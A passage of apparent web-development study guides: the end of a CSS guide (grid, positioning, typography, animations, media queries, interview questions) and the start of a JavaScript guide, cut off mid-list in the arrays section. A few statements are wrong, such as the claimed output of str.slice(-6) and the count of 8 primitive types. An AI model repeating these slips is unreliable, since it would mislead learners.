  align-self: stretch;
}
```

### Common Flexbox Patterns

```css
/* Perfect center */
.center {
  display: flex;
  justify-content: center;
  align-items: center;
}

/* Navbar: logo left, links right */
nav {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

/* Card grid */
.card-grid {
  display: flex;
  flex-wrap: wrap;
  gap: 20px;
}
.card {
  flex: 0 0 calc(33.333% - 14px); /* 3 per row with gap */
}
```

---

## 9. CSS Grid (2-Dimensional Layout)

Grid is for laying out items in both **rows and columns**.

### Container Properties

```css
.grid-container {
  display: grid;             /* or inline-grid */

  /* Define columns */
  grid-template-columns: 200px 1fr 1fr;      /* 3 columns */
  grid-template-columns: repeat(3, 1fr);     /* 3 equal columns */
  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));  /* Responsive */
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));

  /* Define rows */
  grid-template-rows: 80px auto 60px;        /* header, content, footer */
  grid-template-rows: repeat(3, 1fr);

  /* Named areas */
  grid-template-areas:
    "header header header"
    "sidebar main main"
    "footer footer footer";

  /* Gaps */
  gap: 20px;
  row-gap: 20px;
  column-gap: 10px;

  /* Justify items (inline / horizontal) */
  justify-items: start;
  justify-items: end;
  justify-items: center;
  justify-items: stretch;   /* Default */

  /* Align items (block / vertical) */
  align-items: start;
  align-items: end;
  align-items: center;
  align-items: stretch;     /* Default */

  /* Justify entire grid in container */
  justify-content: start;
  justify-content: end;
  justify-content: center;
  justify-content: space-between;
  justify-content: space-around;
  justify-content: space-evenly;

  /* Align entire grid in container */
  align-content: start;
  align-content: end;
  align-content: center;
  align-content: space-between;

  /* Auto-generated rows size */
  grid-auto-rows: 100px;
  grid-auto-columns: 1fr;
  grid-auto-flow: row;       /* Fill rows first */
  grid-auto-flow: column;    /* Fill columns first */
  grid-auto-flow: row dense; /* Fill gaps */
}
```

### Item Placement

```css
.item-1 {
  /* Span specific columns */
  grid-column: 1;              /* Column line 1 to 2 */
  grid-column: 1 / 3;          /* Column lines 1 to 3 */
  grid-column: 1 / span 2;     /* Start at 1, span 2 */
  grid-column: 2 / -1;         /* From 2 to last line */

  /* Span specific rows */
  grid-row: 1;
  grid-row: 1 / 4;
  grid-row: 1 / span 3;

  /* Named area placement */
  grid-area: header;
  grid-area: sidebar;
  grid-area: main;

  /* Self-alignment */
  justify-self: start | end | center | stretch;
  align-self: start | end | center | stretch;
}
```

### Named Grid Areas Example

```css
.layout {
  display: grid;
  grid-template-columns: 250px 1fr;
  grid-template-rows: 80px 1fr 60px;
  grid-template-areas:
    "header  header"
    "sidebar content"
    "footer  footer";
  min-height: 100vh;
  gap: 10px;
}

.site-header  { grid-area: header; }
.site-sidebar { grid-area: sidebar; }
.site-content { grid-area: content; }
.site-footer  { grid-area: footer; }
```

---

## 10. CSS Positioning

```css
/* Static: default, in normal flow */
.default { position: static; }

/* Relative: offset from its normal position */
.offset {
  position: relative;
  top: 10px;    /* Move down 10px from where it would be */
  left: 20px;   /* Move right 20px */
}

/* Absolute: removed from flow, positioned relative to nearest 
   non-static ancestor */
.absolute-child {
  position: absolute;
  top: 0;
  right: 0;         /* Top-right corner of parent */
  width: 100px;
  height: 100px;
}
.parent { position: relative; } /* Establishes positioning context */

/* Fixed: removed from flow, positioned relative to VIEWPORT */
.fixed-header {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;         /* Full width */
  z-index: 1000;    /* Stack on top */
}

/* Sticky: relative until scroll threshold, then fixed */
.sticky-nav {
  position: sticky;
  top: 0;           /* Sticks to top when reached */
  z-index: 100;
}

/* Z-index: stacking order (higher = on top) */
.overlay { z-index: 999; }
.modal   { z-index: 1000; }
.tooltip { z-index: 1001; }
```

---

## 11. Typography

```css
/* Font families */
body {
  font-family: 'Roboto', Arial, Helvetica, sans-serif;
  /* System UI font stack */
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
  /* Monospace */
  font-family: 'Fira Code', 'Courier New', monospace;
}

/* Font size */
h1 { font-size: 3rem; }      /* rem = relative to root element */
p  { font-size: 1rem; }      /* 1rem = 16px by default */
small { font-size: 0.875em; } /* em = relative to parent element */

/* Font weight */
.thin    { font-weight: 100; }
.light   { font-weight: 300; }
.normal  { font-weight: 400; }
.medium  { font-weight: 500; }
.semibold{ font-weight: 600; }
.bold    { font-weight: 700; }
.black   { font-weight: 900; }

/* Font style */
em { font-style: italic; }
.upright { font-style: normal; }

/* Line height */
p { line-height: 1.6; }      /* Unitless = multiplier of font-size */
p { line-height: 24px; }

/* Letter and word spacing */
h1 { letter-spacing: -0.02em; }     /* Tighten headings */
.wide { letter-spacing: 0.1em; }    /* Wide tracking */
p { word-spacing: 2px; }

/* Text alignment */
.left    { text-align: left; }
.center  { text-align: center; }
.right   { text-align: right; }
.justify { text-align: justify; }

/* Text decoration */
a { text-decoration: none; }
u { text-decoration: underline; }
.strikethrough { text-decoration: line-through; }
.underline-custom {
  text-decoration: underline dotted red 2px;
  text-underline-offset: 4px;
}

/* Text transform */
.upper { text-transform: uppercase; }
.lower { text-transform: lowercase; }
.cap   { text-transform: capitalize; }

/* Text overflow and wrapping */
.truncate {
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}

.multi-line-clamp {
  display: -webkit-box;
  -webkit-line-clamp: 3;
  -webkit-box-orient: vertical;
  overflow: hidden;
}

/* Whitespace handling */
pre  { white-space: pre; }          /* Preserve all whitespace */
p    { white-space: normal; }       /* Collapse and wrap (default) */
.nowrap { white-space: nowrap; }    /* Never wrap */

/* Google Fonts import */
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');

/* Custom font */
@font-face {
  font-family: 'MyFont';
  src: url('font.woff2') format('woff2'),
       url('font.woff') format('woff');
  font-weight: normal;
  font-style: normal;
  font-display: swap;   /* Show fallback while loading */
}
```

---

## 12. Colors and Backgrounds

```css
/* Color formats */
.color-examples {
  color: red;                         /* Named */
  color: #ff0000;                     /* Hex (6-digit) */
  color: #f00;                        /* Hex (3-digit shorthand) */
  color: #ff0000ff;                   /* Hex (8-digit with alpha) */
  color: rgb(255, 0, 0);              /* RGB */
  color: rgba(255, 0, 0, 0.5);       /* RGBA (alpha = opacity) */
  color: hsl(0, 100%, 50%);          /* HSL (hue, saturation, lightness) */
  color: hsla(0, 100%, 50%, 0.5);    /* HSLA */
  color: oklch(50% 0.2 30);          /* Modern: perceptually uniform */
  color: currentColor;               /* Inherits current text color */
  color: transparent;
}

/* Backgrounds */
.bg-examples {
  background-color: #f0f0f0;
  background-color: transparent;

  background-image: url('bg.jpg');
  background-image: url('top.png'), url('bottom.png'); /* Multiple layers */
  background-image: linear-gradient(to right, red, blue);
  background-image: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  background-image: radial-gradient(circle at center, red, blue);
  background-image: conic-gradient(red, yellow, green, red);
  background-image: repeating-linear-gradient(45deg, #f5f5f5, #f5f5f5 10px, #fff 10px, #fff 20px);

  background-size: cover;         /* Cover container (may crop) */
  background-size: contain;       /* Fit inside (may leave space) */
  background-size: 100% 100%;    /* Stretch to fill */
  background-size: 200px 100px;  /* Explicit size */

  background-position: center center;
  background-position: top right;
  background-position: 50% 25%;

  background-repeat: no-repeat;
  background-repeat: repeat-x;
  background-repeat: repeat-y;
  background-repeat: repeat;
  background-repeat: space;
  background-repeat: round;

  background-attachment: fixed;  /* Parallax effect */
  background-attachment: scroll; /* Default */
  background-attachment: local;

  background-origin: padding-box;   /* Default */
  background-origin: border-box;
  background-origin: content-box;

  background-clip: padding-box;    /* Default */
  background-clip: border-box;
  background-clip: content-box;
  background-clip: text;           /* Text mask effect */
  -webkit-background-clip: text;
  color: transparent;              /* Show gradient through text */

  /* Shorthand: color image position/size repeat attachment */
  background: #f0f0f0 url('bg.jpg') center/cover no-repeat fixed;
}
```

---

## 13. Shadows and Filters

```css
/* Box shadow */
.shadow {
  box-shadow: 2px 2px 5px rgba(0,0,0,0.3);
  /* x-offset y-offset blur-radius color */

  box-shadow: 2px 2px 5px 2px rgba(0,0,0,0.3);
  /* x y blur spread color */

  box-shadow: inset 0 0 10px rgba(0,0,0,0.2);
  /* inset shadow (inside element) */

  /* Multiple shadows */
  box-shadow: 
    0 1px 2px rgba(0,0,0,0.1),
    0 4px 8px rgba(0,0,0,0.1);
}

/* Text shadow */
.text-shadow {
  text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
  /* x-offset y-offset blur color */
}

/* CSS Filters */
.filter-examples {
  filter: blur(5px);
  filter: brightness(150%);     /* 0% = black, 100% = original */
  filter: contrast(200%);
  filter: grayscale(100%);      /* Black and white */
  filter: hue-rotate(90deg);
  filter: invert(100%);
  filter: opacity(50%);
  filter: saturate(200%);
  filter: sepia(100%);
  filter: drop-shadow(2px 2px 4px black);  /* Like box-shadow for non-rectangular shapes */
  
  /* Chaining filters */
  filter: grayscale(50%) brightness(120%);
}

/* Backdrop filter */
.frosted-glass {
  backdrop-filter: blur(10px);
  background: rgba(255,255,255,0.2);
}
```

---

## 14. CSS Transitions

Transitions animate property changes smoothly.

```css
.btn {
  background: blue;
  color: white;
  padding: 10px 20px;
  
  /* Transition shorthand: property duration timing-function delay */
  transition: background 0.3s ease, transform 0.2s ease-out;
  transition: all 0.3s ease;      /* Transition all properties */
}

.btn:hover {
  background: darkblue;
  transform: translateY(-2px);
}

/* Timing functions */
.timing {
  transition-timing-function: linear;         /* Constant speed */
  transition-timing-function: ease;           /* Fast start, slow end (default) */
  transition-timing-function: ease-in;        /* Slow start */
  transition-timing-function: ease-out;       /* Slow end */
  transition-timing-function: ease-in-out;    /* Slow start and end */
  transition-timing-function: cubic-bezier(0.68, -0.55, 0.265, 1.55); /* Spring */
  transition-timing-function: steps(5, end); /* Stepped animation */
}

/* Delays for staggered effects */
.item-1 { transition-delay: 0s; }
.item-2 { transition-delay: 0.1s; }
.item-3 { transition-delay: 0.2s; }
```

---

## 15. CSS Animations

Animations are more powerful than transitions — they can loop, use keyframes, and run without user interaction.

```css
/* Define keyframes */
@keyframes slideIn {
  from {
    transform: translateX(-100%);
    opacity: 0;
  }
  to {
    transform: translateX(0);
    opacity: 1;
  }
}

@keyframes bounce {
  0%, 100% { transform: translateY(0); }
  25%       { transform: translateY(-20px); }
  50%       { transform: translateY(0); }
  75%       { transform: translateY(-10px); }
}

@keyframes colorShift {
  0%   { background-color: red; }
  33%  { background-color: yellow; }
  66%  { background-color: green; }
  100% { background-color: red; }
}

/* Apply animation */
.animated-element {
  animation-name: slideIn;
  animation-duration: 0.5s;
  animation-timing-function: ease-out;
  animation-delay: 0.2s;
  animation-iteration-count: 1;        /* or infinite */
  animation-direction: normal;          /* normal, reverse, alternate, alternate-reverse */
  animation-fill-mode: both;           /* none, forwards, backwards, both */
  animation-play-state: running;        /* running, paused */

  /* Shorthand: name duration timing delay iterations direction fill-mode */
  animation: slideIn 0.5s ease-out 0.2s 1 normal both;
  
  /* Multiple animations */
  animation: slideIn 0.5s ease, colorShift 2s linear infinite;
}
```

---

## 16. CSS Variables (Custom Properties)

```css
/* Define at :root for global access */
:root {
  --color-primary: #6366f1;
  --color-primary-dark: #4f46e5;
  --color-text: #1e293b;
  --color-bg: #f8fafc;
  --spacing-sm: 8px;
  --spacing-md: 16px;
  --spacing-lg: 32px;
  --font-size-base: 16px;
  --border-radius: 8px;
  --shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
}

/* Use variables */
.btn {
  background-color: var(--color-primary);
  padding: var(--spacing-sm) var(--spacing-md);
  border-radius: var(--border-radius);
  box-shadow: var(--shadow);
}

.btn:hover {
  background-color: var(--color-primary-dark);
}

/* Fallback value if variable undefined */
.element {
  color: var(--text-color, black);
}

/* Override at component level */
.dark-theme {
  --color-bg: #1e1e2e;
  --color-text: #cdd6f4;
}

/* Variables in media queries */
@media (prefers-color-scheme: dark) {
  :root {
    --color-bg: #1a1a2e;
    --color-text: #e2e8f0;
  }
}
```

---

## 17. Responsive Design and Media Queries

```css
/* Mobile-first approach (recommended) */
/* Base styles target small screens, then override for larger */

.container {
  width: 100%;
  padding: 0 16px;
}

/* Small tablets and up (≥ 640px) */
@media (min-width: 640px) {
  .container {
    max-width: 640px;
    margin: 0 auto;
  }
}

/* Tablets and up (≥ 768px) */
@media (min-width: 768px) {
  .container { max-width: 768px; }
  .grid { grid-template-columns: repeat(2, 1fr); }
}

/* Laptops and up (≥ 1024px) */
@media (min-width: 1024px) {
  .container { max-width: 1024px; }
  .grid { grid-template-columns: repeat(3, 1fr); }
}

/* Large desktops (≥ 1280px) */
@media (min-width: 1280px) {
  .container { max-width: 1280px; }
}

/* Max-width (desktop-first) */
@media (max-width: 767px) {
  .nav-links { display: none; }
}

/* Combined range */
@media (min-width: 768px) and (max-width: 1023px) {
  .sidebar { width: 200px; }
}

/* Orientation */
@media (orientation: landscape) { ... }
@media (orientation: portrait) { ... }

/* Device features */
@media (prefers-color-scheme: dark) {
  body { background: #1a1a1a; color: #fff; }
}

@media (prefers-reduced-motion: reduce) {
  * {
    animation-duration: 0.01ms !important;
    transition-duration: 0.01ms !important;
  }
}

@media (hover: none) {
  /* Touch devices — no hover */
  .hover-effect { display: none; }
}

@media print {
  nav, footer, .sidebar { display: none; }
  body { font-size: 12pt; color: black; }
  a::after { content: " (" attr(href) ")"; }
}
```

### Responsive Units

| Unit | Description |
|------|-------------|
| `px` | Fixed pixels |
| `%` | Percentage of parent |
| `em` | Relative to element's own font-size |
| `rem` | Relative to root `<html>` font-size |
| `vw` | 1% of viewport width |
| `vh` | 1% of viewport height |
| `vmin` | 1% of smaller viewport dimension |
| `vmax` | 1% of larger viewport dimension |
| `ch` | Width of "0" character |
| `fr` | Fractional unit (Grid only) |
| `clamp()` | `clamp(min, preferred, max)` |

```css
/* Fluid typography with clamp() */
h1 { font-size: clamp(1.5rem, 5vw, 3rem); }

/* Fluid container */
.container {
  width: min(90%, 1200px);
  margin: 0 auto;
}
```

---

## 18. CSS Architecture Patterns

### BEM (Block Element Modifier)

```css
/* Block */
.card { }
/* Element */
.card__header { }
.card__body { }
.card__footer { }
/* Modifier */
.card--featured { }
.card--dark { }
.card__btn--large { }
```

### Utility Classes (like Tailwind)

```css
.text-center { text-align: center; }
.text-red    { color: red; }
.mt-4        { margin-top: 16px; }
.flex        { display: flex; }
.hidden      { display: none; }
```

---

## 19. Common CSS Patterns and Tricks

```css
/* Sticky footer */
body {
  display: flex;
  flex-direction: column;
  min-height: 100vh;
}
main { flex: 1; }

/* Centered div (modern) */
.center {
  display: grid;
  place-items: center;
}

/* Aspect ratio box */
.video-wrapper {
  aspect-ratio: 16 / 9;
}

/* Smooth scrolling */
html { scroll-behavior: smooth; }

/* CSS Reset essentials */
*, *::before, *::after { box-sizing: border-box; }
* { margin: 0; padding: 0; }
img, video { max-width: 100%; height: auto; display: block; }

/* Visually hidden (accessible) */
.sr-only {
  position: absolute;
  width: 1px; height: 1px;
  padding: 0; margin: -1px;
  overflow: hidden;
  clip: rect(0,0,0,0);
  border: 0;
}

/* Custom scrollbar */
::-webkit-scrollbar { width: 8px; }
::-webkit-scrollbar-track { background: #f1f1f1; }
::-webkit-scrollbar-thumb { background: #888; border-radius: 4px; }

/* Selection color */
::selection { background: #6366f1; color: white; }

/* Overlay */
.overlay {
  position: fixed;
  inset: 0;   /* shorthand for top:0 right:0 bottom:0 left:0 */
  background: rgba(0,0,0,0.5);
}
```

---

## 20. CSS Interview Questions

**Q: What is the difference between `em` and `rem`?**
A: `em` is relative to the element's own font-size (compound with nesting). `rem` is relative to the root `<html>` font-size (consistent).

**Q: Explain the CSS box model. What does `box-sizing: border-box` do?**
A: Content + Padding + Border + Margin. By default (`content-box`), width applies to content only. `border-box` makes width include padding and border, making layouts more predictable.

**Q: What is specificity and how is it calculated?**
A: A score system determining which CSS rule applies. Inline styles (1000) > IDs (100) > Classes/Attributes/Pseudo-classes (10) > Elements/Pseudo-elements (1).

**Q: What is the difference between `display: none` and `visibility: hidden`?**
A: `display: none` removes the element from the layout (takes no space). `visibility: hidden` makes it invisible but it still takes up space.

**Q: What is a CSS variable and how do you use one?**
A: Custom properties defined with `--name: value;` and used with `var(--name)`. Defined on `:root` for global use, or on any element to scope them.

**Q: What is the difference between `position: absolute` and `position: fixed`?**
A: `absolute` positions relative to the nearest non-static ancestor. `fixed` positions relative to the viewport — stays on screen when scrolling.

---

*End of CSS Study Guide*


---

# JavaScript (JS) — Complete Study Guide

---

## 1. What Is JavaScript?

JavaScript is a **high-level, interpreted, dynamically typed** programming language that runs in browsers and (via Node.js) on servers. It is the only native programming language of the web, enabling interactivity, DOM manipulation, data fetching, and full-stack development.

Key characteristics:
- **Dynamically typed** — variables can hold any type
- **Prototype-based** object orientation
- **First-class functions** — functions are values
- **Event-driven** and asynchronous
- **Single-threaded** with an event loop

---

## 2. Including JavaScript

```html
<!-- Inline (avoid for large code) -->
<script>
  console.log("Hello!");
</script>

<!-- External (preferred) -->
<script src="script.js" defer></script>

<!-- At end of body (old approach) -->
<body>
  ...
  <script src="script.js"></script>
</body>
```

---

## 3. Variables

```javascript
// var: function-scoped, hoisted, re-declarable (avoid in modern JS)
var name = "Alice";
var name = "Bob";  // OK — no error

// let: block-scoped, not re-declarable (preferred for mutable)
let age = 25;
age = 26;    // OK — reassignable
// let age = 27;  // Error — cannot redeclare

// const: block-scoped, must be initialized, cannot be reassigned
const PI = 3.14159;
// PI = 3;  // Error — cannot reassign

// const with objects/arrays: the reference is const, not the value
const user = { name: "Alice" };
user.name = "Bob";   // OK — mutating the object
user.age = 25;       // OK — adding property
// user = {};        // Error — cannot reassign

const arr = [1, 2, 3];
arr.push(4);          // OK — mutating the array
// arr = [5, 6];      // Error

// Naming conventions
let camelCase = "standard for variables and functions";
let UPPER_SNAKE = "for constants";
let PascalCase = "for classes";
let _private = "convention for private members";
```

---

## 4. Data Types

JavaScript has **8 primitive types** + **objects**:

```javascript
// Primitives (immutable values)
let num1 = 42;                // Number (integers and floats are same type)
let float1 = 3.14;
let bigInt = 9007199254740991n; // BigInt (suffix n)
let str = "Hello";            // String
let str2 = 'World';
let template = `Hello, ${str2}!`; // Template literal
let bool = true;              // Boolean
let nothing = null;           // Null (intentional absence)
let unknown = undefined;      // Undefined (not yet assigned)
let sym = Symbol("id");       // Symbol (unique identifier)

// Object types (mutable)
let obj = { key: "value" };  // Object
let arr = [1, 2, 3];         // Array (special object)
let fn = function() {};       // Function (callable object)
let date = new Date();        // Date
let re = /pattern/g;          // RegExp

// Type checking
typeof 42          // "number"
typeof "hello"     // "string"
typeof true        // "boolean"
typeof undefined   // "undefined"
typeof null        // "object"  ← HISTORICAL BUG in JS
typeof {}          // "object"
typeof []          // "object"
typeof function(){} // "function"
typeof Symbol()    // "symbol"
typeof 42n         // "bigint"

// Better type checks
Array.isArray([])              // true
obj instanceof Date            // true
Object.prototype.toString.call([]) // "[object Array]"
```

### Type Coercion

```javascript
// Implicit coercion (JS automatically converts types)
"5" + 3        // "53" (number converted to string)
"5" - 3        // 2   (string converted to number)
"5" * "3"      // 15
true + 1       // 2   (true = 1)
false + 1      // 1   (false = 0)
null + 1       // 1   (null = 0)
undefined + 1  // NaN (undefined can't convert)

// Explicit conversion
Number("42")     // 42
Number("hello")  // NaN
Number(true)     // 1
Number(null)     // 0
Number(undefined)// NaN

String(42)       // "42"
String(true)     // "true"
String(null)     // "null"

Boolean(0)       // false
Boolean("")      // false
Boolean(null)    // false
Boolean(undefined) // false
Boolean(NaN)     // false
Boolean(false)   // false
// Everything else is truthy!

parseInt("42px")  // 42 (parses until non-number)
parseFloat("3.14abc") // 3.14

// Equality
5 == "5"     // true  (loose: converts types)
5 === "5"    // false (strict: no conversion)
null == undefined   // true
null === undefined  // false
// ALWAYS use === in practice
```

---

## 5. Strings

```javascript
const str = "Hello, World!";

// Properties
str.length        // 13

// Methods
str.toUpperCase()             // "HELLO, WORLD!"
str.toLowerCase()             // "hello, world!"
str.trim()                    // Remove whitespace from both ends
str.trimStart()               // Remove from start
str.trimEnd()                 // Remove from end
str.includes("World")         // true
str.startsWith("Hello")       // true
str.endsWith("!")             // true
str.indexOf("o")              // 4 (first occurrence)
str.lastIndexOf("o")          // 8 (last occurrence)
str.slice(7, 12)              // "World" (start, end-exclusive)
str.slice(-6)                 // "orld!" (from end)
str.substring(7, 12)          // "World" (like slice, no negatives)
str.split(", ")               // ["Hello", "World!"]
str.replace("World", "JS")    // "Hello, JS!" (first occurrence)
str.replaceAll("l", "L")      // "HeLLo, WorLd!"
str.repeat(2)                 // "Hello, World!Hello, World!"
str.padStart(15, "0")         // "00Hello, World!"
str.padEnd(15, ".")           // "Hello, World!.."
str.charAt(0)                 // "H"
str.charCodeAt(0)             // 72 (ASCII code)
str[0]                        // "H" (bracket notation)

// Template literals
const name = "Alice";
const age = 25;
const intro = `Name: ${name}, Age: ${age}`;
const math = `Result: ${2 + 2}`;
const multi = `
  Line 1
  Line 2
  Line 3
`;

// Regular expressions with strings
str.match(/[A-Z]/g)           // ["H", "W"]
str.search(/World/)           // 7 (index)
str.replace(/o/g, "0")        // "Hell0, W0rld!"
```

---

## 6. Numbers and Math

```javascript
const num = 42;
const float = 3.14159;

// Special values
Infinity        // Positive infinity
-Infinity       // Negative infinity
NaN             // Not a Number
Number.MAX_SAFE_INTEGER   // 9007199254740991
Number.MIN_SAFE_INTEGER   // -9007199254740991
Number.MAX_VALUE          // ~1.8e308
Number.EPSILON            // ~2.2e-16

// Number methods
(3.14159).toFixed(2)      // "3.14" (string!)
(1000000).toLocaleString() // "1,000,000"
(255).toString(16)         // "ff" (hex)
(255).toString(2)          // "11111111" (binary)
Number.isInteger(42)       // true
Number.isFinite(Infinity)  // false
Number.isNaN(NaN)          // true — better than global isNaN()
Number.parseInt("42px")    // 42
Number.parseFloat("3.14x") // 3.14

// Math object
Math.PI            // 3.141592...
Math.E             // 2.718...
Math.abs(-5)       // 5
Math.round(4.5)    // 5
Math.floor(4.9)    // 4
Math.ceil(4.1)     // 5
Math.trunc(4.9)    // 4 (remove decimal)
Math.max(1, 5, 3)  // 5
Math.min(1, 5, 3)  // 1
Math.pow(2, 10)    // 1024
Math.sqrt(16)      // 4
Math.cbrt(27)      // 3
Math.log(Math.E)   // 1
Math.log2(8)       // 3
Math.log10(1000)   // 3
Math.sign(-5)      // -1
Math.sign(0)       // 0
Math.sign(5)       // 1
Math.random()      // 0 to 0.999...

// Random integer between min and max (inclusive)
function randInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

// Rounding issues (floating point!)
0.1 + 0.2 === 0.3  // FALSE — 0.30000000000000004
Math.abs(0.1 + 0.2 - 0.3) < Number.EPSILON  // TRUE — correct comparison
```

---

## 7. Operators

```javascript
// Arithmetic
+   -   *   /   %   **        // Add, sub, mul, div, modulo, exponent
10 % 3    // 1 (remainder)
2 ** 10   // 1024

// Assignment
=   +=   -=   *=   /=   %=   **=
x += 5   // x = x + 5

// Comparison (always use === and !==)
==  !=    // Loose (avoid)
=== !==   // Strict (use these)
<   >   <=   >=

// Logical
&&    // AND
||    // OR
!     // NOT
??    // Nullish coalescing

// Ternary
let result = condition ? valueIfTrue : valueIfFalse;
let status = age >= 18 ? "adult" : "minor";

// Nullish coalescing (??)
// Returns right side only if left is null or undefined
let name = user.name ?? "Guest";   // If null/undefined, use "Guest"
// vs OR (returns right side for ANY falsy value)
let name2 = user.name || "Guest";  // If "", 0, false, null, undefined

// Optional chaining (?.)
let city = user?.address?.city;    // undefined if any step is null/undefined
let fn = obj?.method?.();          // Call only if method exists
let item = arr?.[0];               // Array access

// Logical assignment
x &&= y   // x = x && y   (assign only if x is truthy)
x ||= y   // x = x || y   (assign only if x is falsy)
x ??= y   // x = x ?? y   (assign only if x is null/undefined)

// Bitwise operators
&     // AND
|     // OR
^     // XOR
~     // NOT (bitwise)
<<    // Left shift
>>    // Right shift
>>>   // Unsigned right shift

// Spread operator
const arr2 = [...arr1, 4, 5];        // Spread array
const obj2 = { ...obj1, c: 3 };      // Spread object
function sum(...nums) { ... }         // Rest parameter

// Comma operator
let x = (1, 2, 3);   // x = 3 (evaluates all, returns last)

// Delete operator
delete obj.property;  // Removes property from object

// typeof and instanceof
typeof value
value instanceof Constructor

// void operator
void 0        // undefined — used as "undefined" in older code
void expr     // Evaluates expr but returns undefined
```

---

## 8. Control Flow

### Conditionals

```javascript
// if / else if / else
if (score >= 90) {
  grade = "A";
} else if (score >= 80) {
  grade = "B";
} else if (score >= 70) {
  grade = "C";
} else {
  grade = "F";
}

// switch
switch (day) {
  case "Monday":
  case "Tuesday":
    console.log("Weekday");
    break;
  case "Saturday":
  case "Sunday":
    console.log("Weekend");
    break;
  default:
    console.log("Unknown");
}

// Ternary (for simple cases)
const message = isLoggedIn ? "Welcome back!" : "Please log in";

// Nullish coalescing for defaults
const port = config.port ?? 3000;
```

### Loops

```javascript
// for loop
for (let i = 0; i < 10; i++) {
  if (i === 5) break;       // Exit loop
  if (i % 2 === 0) continue; // Skip to next iteration
  console.log(i);
}

// while loop
let n = 0;
while (n < 10) {
  n++;
}

// do...while (executes at least once)
do {
  input = prompt("Enter a number:");
} while (isNaN(input));

// for...of (iterate over iterable values: arrays, strings, Sets, Maps)
const fruits = ["apple", "banana", "cherry"];
for (const fruit of fruits) {
  console.log(fruit);
}

for (const char of "hello") {
  console.log(char);  // h, e, l, l, o
}

// for...in (iterate over object KEYS — use with caution on arrays)
const user = { name: "Alice", age: 25, city: "NYC" };
for (const key in user) {
  console.log(`${key}: ${user[key]}`);
}

// Labeled statements (for nested loop control)
outer: for (let i = 0; i < 3; i++) {
  for (let j = 0; j < 3; j++) {
    if (j === 1) break outer;  // Break outer loop
  }
}
```

---

## 9. Functions

```javascript
// Function declaration (hoisted — can call before definition)
function greet(name) {
  return `Hello, ${name}!`;
}

// Function expression (NOT hoisted)
const greet = function(name) {
  return `Hello, ${name}!`;
};

// Arrow function (concise, lexical this)
const greet = (name) => `Hello, ${name}!`;
const square = n => n * n;           // Single param: no parens needed
const add = (a, b) => a + b;
const getObj = (a) => ({ value: a }); // Return object: wrap in parens

// Arrow function with body
const process = (data) => {
  const cleaned = data.trim();
  const result = cleaned.toUpperCase();
  return result;
};

// Default parameters
function createUser(name, role = "user", active = true) {
  return { name, role, active };
}
createUser("Alice");           // { name: "Alice", role: "user", active: true }
createUser("Bob", "admin");    // { name: "Bob", role: "admin", active: true }

// Rest parameters (gather remaining args into array)
function sum(...numbers) {
  return numbers.reduce((acc, n) => acc + n, 0);
}
sum(1, 2, 3, 4, 5);  // 15

// Spread in function calls
const nums = [1, 2, 3];
Math.max(...nums);      // Same as Math.max(1, 2, 3)

// Arguments object (old style — avoid in modern JS)
function old() {
  console.log(arguments);  // Array-like object
}

// Immediately Invoked Function Expression (IIFE)
(function() {
  console.log("Runs immediately!");
})();

// Recursive function
function factorial(n) {
  if (n <= 1) return 1;
  return n * factorial(n - 1);
}

// Pure functions (no side effects, same input = same output)
const double = (n) => n * 2;  // Pure

// Higher-order functions
function applyToAll(arr, fn) {
  return arr.map(fn);
}
applyToAll([1, 2, 3], n => n * 2);  // [2, 4, 6]

// Closures: inner function remembers outer scope
function makeCounter(start = 0) {
  let count = start;
  return {
    increment: () => ++count,
    decrement: () => --count,
    value: () => count,
    reset: () => { count = start; }
  };
}
const counter = makeCounter(10);
counter.increment();  // 11
counter.increment();  // 12
counter.value();      // 12
```

---

## 10. Arrays

```javascript
// Creation
const arr = [1, 2, 3, 4, 5];
const arr2 = new Array(5);              // [empty × 5]
const arr3 = new Array(1, 2, 3);       // [1, 2, 3]
const arr4 = Array.from({ length: 5 }, (_, i) => i + 1);  // [1,2,3,4,5]
const arr5 = Array.from("hello");      // ["h","e","l","l","o"]
const arr6 = Array.of(1, 2, 3);       // [1, 2, 3]

// Access and modification
arr[0]             // 1 (first)
arr[arr.length-1]  // 5 (last)
arr.at(-1)         // 5 (modern — negative index from end)
arr.at(-2)         // 4

// Mutating methods (modify original array)
arr.push(6)        // Add to end; returns new length
arr.pop()          // Remove from end; returns removed element
arr.unshift(0)     // Add to beginning; returns new length
arr.shift()        // Remove from beginning; returns removed element
arr.splice(1, 2)        // Remove 2 elements starting at index 1; returns removed
arr.splice(1, 0, "a")   // Insert "a" at index 1, remove 0
arr.splice(1, 1, "b")   // Replace element at index 1 with "b"
arr.reverse()      // Reverses in place
arr.sort()         // Sorts in place (default: string sort!)
arr.sort((a, b) => a - b)   // Numeric ascending
arr.sort((a, b) => b - a)   // Numeric descending
arr.sort((a, b) => a.name.localeCompare(b.name))  // By string property
arr.fill(0)        // Fill entire array with 0
arr.fill(0, 2, 4)  // Fill indices 2-3 with 0
arr.copyWithin(0, 3) // Copy elements from index 3 to position 0

// Non-mutating methods (return new array/value)
arr.slice(1, 3)        // [2, 3] — elements from 1 to 3 (exclusive)
arr.concat([6, 7])     // Merge arrays
arr.join(" - ")        // "1 - 2 - 3 - 4 - 5"
arr.flat()             // Flatten one level: [[1,2],[3,4]] → [1,2,3,4]
arr.flat(Infinity)     // Flatten all levels
arr.flatMap(n => [n, n*2])  // Map then flat one level
[...arr]               // Shallow copy

// Search
arr.includes(3)        // true
arr.indexOf(3)         // 2
arr.lastIndexOf(3)     // 2
arr.find(n => n > 3)   // 4 (first match)
arr.findIndex(n => n > 3) // 3
arr.findLast(n => n < 4)  // 3 (from end)
arr.findLastIndex(n => n < 4) // 2

// Iteration
arr.forEach(n => console.log(n));
arr.map(n => n * 2)           // [2, 4, 6, 8, 10] — transform
arr.filter(n => n % 2 === 0)  // [2, 4] — keep matching
arr.reduce((acc, n) => acc + n, 0)  // 15 — accumulate
arr.reduceRight((acc, n) => acc + n, 0)  // Same but right to left
arr.every(n => n > 0)         // true — ALL match
